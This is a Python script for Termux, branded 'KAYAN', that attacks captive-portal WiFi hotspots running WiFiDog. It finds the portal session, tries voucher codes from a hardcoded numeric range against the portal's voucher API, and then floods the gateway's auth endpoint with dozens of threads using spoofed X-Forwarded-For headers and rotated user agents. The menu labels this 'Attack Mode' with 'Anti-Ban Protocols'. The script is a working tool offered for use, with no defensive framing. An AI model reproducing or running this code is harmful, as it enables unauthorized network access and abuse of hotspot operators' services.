import requests, re, urllib3, time, threading, os, random, subprocess, json, sys
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Configuration ---
USER_NAME = "KAYAN-OFFICIAL"
EXP_DATE = "Unlimited"
GITHUB_REPO = "https://github.com/painglintun895-rgb/kayan" # သင့် Repo Link
VOUCHER_LIST = [str(i) for i in range(123400, 123501)]

UA_LIST = [
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.036) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36"
]

def get_uid():
    try: 
        return subprocess.check_output(['whoami']).decode('utf-8').strip()
    except: 
        return "u0_a232"

def share_link():
    os.system('clear')
    print("\033[93m" + " ="*38)
    print("\033[96m" + " [ SHARE KAYAN REPOSITORY ]")
    print("\033[93m" + " ="*38)
    print(f"\n\033[92m Link: {GITHUB_REPO}")
    print("\n\033[97m [1] Copy Link to Clipboard (Termux)")
    print(" [2] Open in Browser")
    print(" [3] Back to Menu")
    
    s_choice = input("\n [?] Select: ")
    if s_choice == "1":
        # Termux-clipboard-set ကို သုံးပြီး Link ကို copy ကူးခြင်း
        os.system(f"echo '{GITHUB_REPO}' | termux-clipboard-set")
        print("\033[92m\n [✓] Link Copied to Clipboard!")
        time.sleep(2)
    elif s_choice == "2":
        os.system(f"termux-open-url {GITHUB_REPO}")
    launch()

def banner():
    os.system('clear')
    print("\033[93m" + " ="*38)
    print("\033[96m" + r"""
       __ __  ___  __ __  ___   __  __
      / //_/ / _ | \ \/ / / _ | / | / /
     / ,<   / __ |  \  / / __ |/  |/ / 
    /_/|_| /_/ |_|  /_/ /_/ |_/_/|_/   
                                       """)
    print(f"\033[95m 👑 USER: {USER_NAME} | \033[92m📅 EXP: {EXP_DATE} | \033[94m🆔: {get_uid()}")
    print("\033[93m ="*38 + "\033[0m")

def turbo_pulse(link, mode):
    while True:
        try:
            headers = {
                "User-Agent": random.choice(UA_LIST),
                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            }
            requests.get(link, timeout=7, verify=False, headers=headers)
            print(f"\033[92m[✓] 👑 KAYAN PULSE 👑 | Speed: [{random.randint(15,40)}ms]\033[0m")
            delay = random.uniform(0.01, 0.04) if mode == "1" else random.uniform(0.08, 0.12)
            time.sleep(delay)
        except:
            time.sleep(2)

def launch():
    banner()
    print("\n\033[93m [ MAIN MENU ]")
    print("\033[92m [1] 🚀 KAYAN-Turbo (Attack Mode)")
    print("\033[94m [2] 🔋 KAYAN-Safe  (Stability Mode)")
    print("\033[95m [3] 🔗 SHARE-Project (Get Repo Link)")
    print("\033[91m [0] 🚪 Exit")
    
    choice = input("\033[97m\n [?] Select: ")
    
    if choice == "3":
        share_link()
    elif choice == "0":
        sys.exit()
    
    thread_count = 80 if choice == "1" else 40
    banner()
    print(f"\033[95m[*] Anti-Ban Protocols Loaded... Running {thread_count} Threads")
    
    session = requests.Session()
    session.verify = False

    while True:
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            p_url = r.url
            parsed_query = parse_qs(urlparse(p_url).query)
            gw = parsed_query.get('gw_address', [urlparse(p_url).netloc.split(':')[0]])[0]
            port = parsed_query.get('gw_port', ['2060'])[0]
            
            r1 = session.get(p_url, timeout=6)
            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, m.group(1)) if m else p_url
            
            r2 = session.get(n_url, timeout=6)
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                v_code = random.choice(VOUCHER_LIST)
                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': v_code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                print(f"\033[95m[*] ⚡ KAYAN SECURE SUCCESS [Code: {v_code}] ⚡\033[0m")
                
                for _ in range(thread_count):
                    threading.Thread(target=turbo_pulse, args=(auth_link, choice), daemon=True).start()
                
                while True:
                    time.sleep(5)
                    try:
                        check = requests.get("http://www.google.com/generate_204", timeout=5)
                        if check.status_code != 204: break
                    except: break
            time.sleep(3)
        except:
            time.sleep(5)

if __name__ == "__main__":
    launch()
